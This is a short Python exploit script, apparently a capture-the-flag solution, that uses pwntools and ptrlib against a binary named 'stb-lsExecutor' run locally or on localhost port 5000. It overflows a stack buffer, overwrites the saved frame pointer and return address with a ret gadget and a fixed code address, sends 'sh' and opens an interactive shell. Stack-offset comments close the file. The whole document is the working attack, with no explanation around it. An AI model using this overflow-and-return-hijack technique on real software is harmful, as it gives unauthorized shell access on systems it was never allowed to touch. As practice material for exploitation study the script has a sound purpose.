#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./stb-lsExecutor")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendafter("Enter option : ", b"A" * 0x3C)
    payload = b""
    payload += b"A" * 48
    payload += ptr.p64(0x404079 + 0x70)
    payload += ptr.p64(next(exe.gadget("ret;")))
    # payload += ptr.p64(next(exe.gadget("ret;")))
    # payload += ptr.p64(unwrap(exe.plt("read")))
    payload += ptr.p64(0x4013CB)
    io.sendafter("Enter path : ", payload)
    input(">> ")
    io.sendline(b"n")
    io.send(b"sh")
    io.interactive()
    return


if __name__ == "__main__":
    main()


# 0x7fffffffeaa0: option buffer (0x3c)
# | 0x40
# 0x7fffffffeae0: command (0x1e) (0x40 or 0x41)
# 0x7fffffffeae0 + len(command): (0x46)
# 0x7fffffffeb58: rip
